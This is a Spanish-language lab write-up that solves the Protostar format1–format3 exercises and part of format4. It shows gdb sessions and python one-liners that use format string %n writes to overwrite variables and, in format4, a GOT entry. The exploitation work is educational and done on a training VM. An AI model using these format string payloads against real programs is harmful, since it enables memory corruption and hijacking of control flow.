## Índice 
- [Sobreescribir una varaible](#sobreescribir-una-variable)
- [Escribir un número de bytes en una variable](#escribir-un-número-de-bytes-en-una-variable)
- [Escribir un valor hexadecimal en una variable](#escribir-un-valor-hexadecimal-en-una-variable)


---------------------------------------------------------------------------
# Sobreescribir una variable -> [format1](https://exploit.education/protostar/format-one/)

Este binario toma un argumento (al que llama "string"), lo mete en la funcion **printf()** y te imprime dicho argumento

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA
AAA[user@protostar]-[/opt/protostar/bin]:$ 
```
 Como no hace un salto de linea, lo ponemos nosotros concatenando "; echo"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA; echo
AAA
[user@protostar]-[/opt/protostar/bin]:$ 
```
 ¿Si en vez de pasarle una "A" le pasamos una cadena de formateo como %x (numero hexadecimal)?
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 %x; echo
804960c
[user@protostar]-[/opt/protostar/bin]:$ ./format1 "%x %x"; echo
804960c bffff6e8
```
 Este "bffff6e8" parece una direccion de la pila... Vamos a mirar en gdb, poniendo un breakpoint en una funcion cuaqluiera (prinff())
 para ver como es la pila con datos.
 
```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('%x'*4)"  > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./format1
(gdb) disas vuln
0x080483f4 <vuln+0>:	push   %ebp
...
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
...
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
(gdb) b *0x08048400
(gdb) run < /tmp/pattern
Starting program: /opt/protostar/bin/format1 < /tmp/pattern
Breakpoint 4, 0x08048400 in vuln (string=0x0) at format1/format1.c:10
(gdb) x/8wx $esp
0xbffff670:	0x00000000	0x0804960c	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0xbffff6a8	0x08048435	
```
    
Como podemos ver la segunda entrada de la pila es nuestro "0x0804960c" que se imprimió antes, es decir, prinf(%x) imprime contenido de la pila.

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*150 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
3174616d
41414100
42424241
7838252e
7838252e
```
   Nos está imrpimiendo muchos valores de la pila, en cierto momento, se ven "41" y "42", que equivalen a nuestras "A" y "B", seguidos de "7838252e"
   que son nuestras "%8x.". El objetivo, esque sean las A los útlimos valores que salgan, para eso hay que reducir las x u offset.
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
726f662f
3174616d
41414100
42424241
```
   El problema esque se han mezclado los 42 y los 41 (A)s y (B)s, y tiene que quedar perfecto, asi que se reduce el numero de "B"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
41414141
78382542
7838252e
7838252e
7838252e
```
  Se quitan mas "x"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*168 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
2f2e0000
6d726f66
317461
41414141
```
  Perfecto, ya están alineados nuestras, "A". Pero ahora lo que interesa es cambiar esas "A" por otra cosa, la direccion de la varaible 
  que queremos modificar:
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format1 | grep "target"
08049638 g     O .bss	00000004              target
```
  La direccion de la variable "target" es *0x08049638* que si lo pasamos a endian (dar la vuelta a los bytes) sale -> *\x38\x96\x04\x08*
  Ahora sustituimos las "AAAA" por esa dirección (ambas cosas ocupan 4 bytes).
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
8049638
```
  Perfecto, la dirección de memoria se ha alineado perfectamente. Ahora hay que sobrrescribirla cambiando la "%x" por "%n"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
you have modified the target :)
```
  Y ya está, primer format completado.
  
  **Entonces. ¿Que hemos hecho con todo esto?** Primero hemos observado el binario, la pila... Hemos visto que nos imprimía valores de esta al pasarle
  "%x" y que a cierto numero de estos, se muestra nuestro input. 
  Hemos sustituido un input random "AAAA" por la direccion de una varaible (target = \x38\x96\x04\x08)
  La hemos colocado al final y hemos escrito en ella con "%n". 
  Es decir gracias a "%n" podemos escribir dentro de una direccion de memoria que pongamos en la pila. (gracias a que esta actua como puntero).
  
  **¿Que hemos escrito en la varaible target?** La "B"
  
  **Y si en vez de una direccion de memoria válida hubieramos metido las "AAAA"?** Que %n diria de escribir en una memoria que no existe en (0x41414141)
  no hay nada. Entonces arrojaría un segmentation fault.
  
  **A nivel de código que hemos hecho?** Exactamente esto ->  ```printf("AAAA%n", &variable) -> varaible = "AAAA"```
  
---------------------------------------------------------------------------
# Escribir un número de bytes en una variable -> [format2](https://exploit.education/protostar/format-two/)

Format2 no nos pide un argumento sino un input una vez ejecutado, la manera de pasarle dichi input por tanto cambia
  
```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%8x."*5)' | ./format2
AAAA     200.b7fd8420.bffff524.41414141.2e783825.
target is 0 :(
```
A diferencia del caso anterior, el offset es mucho menor, es decir nos imprime nuestro input de AAAA mucho antes.
Si seguimos lo que hemos aprendido del primer format daremos con la conclusión de que la cuarta direccion que nos imprime (donde empiezan 
las AAAA) es donde poner nuestra direccion de memoria y con la que escribir las "B" gracias al paráemtro "%n".

Vamos a ver la dirección de la memoria que tenemos que sobreescribir
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format2 | grep "target"
080496e4 g     O .bss	00000004              target
```
O sea: *\xe4\x96\x04\x08*

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%x")' | ./format2
B     200.b7fd8420.bffff524.80496e4
target is 0 :(
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"+ "%8x."*3 + "%n")' | ./format2
B     200.b7fd8420.bffff524.
target is 32 :(
```
Hemos conseguido escribir en la variable. Pero ahora os introduciré dos comandos interesantes que nos abreviarán las cosas.
> **"%4$n"** es escribe en el cuarto argumento (la cuarta dirección), lo que equivale a nuestro *"%8x."*3 + "%n"* de antes

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B" + "%4$n")' | ./format2
B
target is 5 :(
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%4$n")' | ./format2
�
target is 4 :(
```
Es decir, de por sí escribe 4 bytes (5 si le metemos la "B"). Pero el ejecicio dice que nos tiene que salir "target = 64" O sea escribir 64 bytes.
Si a 64 le restamos los 4 bytes, nos da 60, así que hay que meter 60 bytes.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "B"*60 + "%4$n")' | ./format2
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
you have modified the target :)
```
Esto tambíen se puede poner de otra forma, que es así:
> **"%60d%4$n"**  escribe en el cuarto argumento 60 dígitos.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xe4\x96\x04\x08" + "%60d%4$n")' | ./format2
                                                         512
you have modified the target :)
```
---------------------------------------------------------------------------
# Escribir un valor hexadecimal en una variable -> [format3](https://exploit.education/protostar/format-three/)

Otra vez lo mismo, buscar una varaible con el objdump -t -> 080496f4 =  \xf4\x96\x04\x08
Esta vez en vez de tener que escribir un numero de bytes en concreto, hay que meter un valor en hexadecimal, es decir que la memoria a donde
apunte nuestro puntero (la direccion de la varaible) tiene que tener escrito esto: "01025544"

El padding esta vez son 12 direcciones de memoria
"%8x."\*12 -> "%12$x" -> escribir "%12$n"

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%12$n")' | ./format3 
��
target is 00000004 :(
```
Nos ha escrito el valor hexadecimal "0x4"
Si %d escribia bytes, %x escribe hexadecimal, (lo que hemos estado usando para printear las direcciones vaya)
Si nos sale 0x4 hay que restar lo que nos debe salir a lo que no sale y pasarle eso con el parametro x.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb
(gdb) p 0x01025544 - 00000004
$1 = 16930112
(gdb) quit
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
you have modified the target :)
```
###Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn" + "%13$hn")' | ./format3 ;echo 
�� target is 00080008 :(
```
Aui hemos puesto dos dierecciones de memoria, la primera es la de la varaible target (la misma que con 4 bytes) y la segunda es la misma pero sumando 2-> 0x080496f4 y 0x080496f6) Es decir, dos memorias para escribir 2 bytes en cada una (mitad del valor la varaible para una mitad para la otra en vez de todo para una como antes). Como ya tenemos dos argumentos en vez de uno pues %12 y %13. Y en h es para lo de escribir dos bytes.

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb
(gdb) p 0x0102 - 0x0008
$1 = 250
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%13$hn")' | ./format3 ;echo 
target is 01020102 :(
```
El primer byte son 0102 y el segundo tambiennos ha escrito eso, pero tiene que ser "01025544" asi que nos falta un poco para llegar, veamos cuanto:

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb
(gdb) p 0x5544 - 0x0102 
$1 = 21570
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
target is 55440102 :(
```
Vaya, resulta ser que nos ha salido al reves (quizas no hemos tenido en cuenta el tema del endian que da la vuelta a todo) asi que cuando trabajemos con dos bytes hay que poner o las memorias al reves o los argumentos al reves.

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn")' | ./format3 | tail -n1
you have modified the target :)
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
you have modified the target :)
```
###Extra -> en vez de escribir los 4 bytes, escribimos de 1 en 1

Ahora como escribimos un byte por memoria, escribimos 4 memorias  (0x080496f4, f5, f6 y f7) Pero como no hay parejas de dos bytes que se cambien, pueden ir en el orden bueno

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n")' | ./format3 | tail -n1
target is 10101010 :(
```
El ultimo byte tiene que ser 44 "01025544" -> primero por el endian \x44\x55\x02\x01""
```console
(gdb) print 0x44 - 0x10
$1 = 52
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%13$n%14$n%15$n")' | ./format3 | tail -n1
target is 44444444 :(
```
Ahora las restas siguiendo la lógica de antes. Al segundo byte añadirle la diferencia (entre lo que nos sale y lo que nos debe salir)

```console
(gdb) p 0x55 - 0x44
$1 = 17
(gdb) quit
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%14$n%15$n")' | ./format3 | tail -n1
target is 55555544 :(
```
Y con el resto leña al mono
```console
(gdb) p 0x02 - 0x55
$2 = -83 -> Ha salido negativo asi que hay que meter un byte mas a la izquierda
(gdb) p 0x102 - 0x55
$3 = 173
[user@protostar]-[/opt/protostar/bin]:$python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%173x%14$n%15$n")' | ./format3 | tail -n1
target is 02025544 :(
(gdb) p 0x01 - 0x02
$1 = -1
(gdb) p 0x101 - 0x02 -> Igual que antes, bit a la izquierda
$5 = 255
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52x%12$n%17x%13$n%173x%14$n%255x%15$n")' | ./format3 | tail -n1
you have modified the target :)
```


Articulo que me ha ayudado y del que he aprendido [aqui](https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e83)

---------------------------------------------------------------------------
# Sobreescribir la GOT para saltar a una funcion que nos interese-> [format4](https://exploit.education/protostar/format-four/)

Este binario al ejecutarlo se parece mucho a format2, pero no nos sale nada mas. Tambien, hay la vuln de format string.

```console
[user@protostar]-[/opt/protostar/bin]:$ user@protostar:/opt/protostar/bin$ ./format4 AAA
AAAA
AAAA
user@protostar:/opt/protostar/bin$ ./format2
AAAA
AAAA
target is 0 :(
user@protostar:/opt/protostar/bin$ ./format4
AAAA
AAAA
user@protostar:/opt/protostar/bin$ python -c 'print("%8x."*5)' | ./format4
200.b7fd8420.bffff524.2e783825.2e783825.
```

El buffer son 512 bytes, y este ejercicio esta pensado para la vuln de "cadenas de formateo" nada de buffer overflows, Es por eso que no salta ningun segfault si le metemos mas bytes de la cuenta por que los descarta.

```console
python -c 'print("A" * 560)' | ./format4; echo
```

Solo que hay una función llamada "hello"

```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -d ./format4
080484b4 <hello>:
80484b4:	55
```
Abrimos el programa con gdb y le echamos un vistazo.
Adelanto que aquí entra en juego el concepto de la [GOT](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/binarios/Estructura%20de%20un%20binario.md) Tenemos que poner la direccion de la función "hello()" en la tabla GOT (por tanto el programa vera que hay algo ahi y no llamará al loader, este no buscará la direccion buena de exit())

Cuando se examina un binario sin haber hecho ningun breakpoint (o sea no esta en ejecucion) nos sale las entradas de la GOT, (no la llamada a ld.so)

```console
[user@protostar]-[/opt/protostar/bin]:$ gdb ./format4 
(gdb) set disassembly-flavor intel
(gdb) disas main
Instrucciones de main entre ellas, saltar a vuln()
0x0804851a <main+6>:	call   0x80484d2 <vuln>
(gdb) disas vuln
...
0x0804850f <vuln+61>:	call   0x80483ec <exit@plt> -> Entrada en la tabla plt de exit()
(gdb) x/i 0x80483ec       -> Nos interesa ver la primera inturccion de plt (la que tiene relacion con la GOT, no las del ld.so)
0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada a la GOT de exit()
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 -> Código de exit()
```
Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hay que sustituirla por la
de hello(). En gdb es muy fácil

```console
(gdb) b *0x0804850f 
(gdb) r
Starting program: /opt/protostar/bin/format4 
AAAA
AAAA
Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
(gdb) set {int}0x8049724=0x080484b4
(gdb) c
Continuing.
code execution redirected! you win
Program exited with code 01.
```
Hay que explotarlo con el format string. Ya adelanto que es el 4º argumento.
> **%4$x"\*4** Escribir a partir del cuarto elemento (pero no en la memoria de ningun puntero de la pila como con %n sino en la pila en sí)

```console
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x")' | ./format4
AAAA41414141
[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x"*4)' | ./format4
AAAA41414141414141414141414141414141
```
Para escribir en la primera entrada de exit plt (la que le dice a GOT que funcion llamar), se toma la direccion de exit de antes (0x8049724)

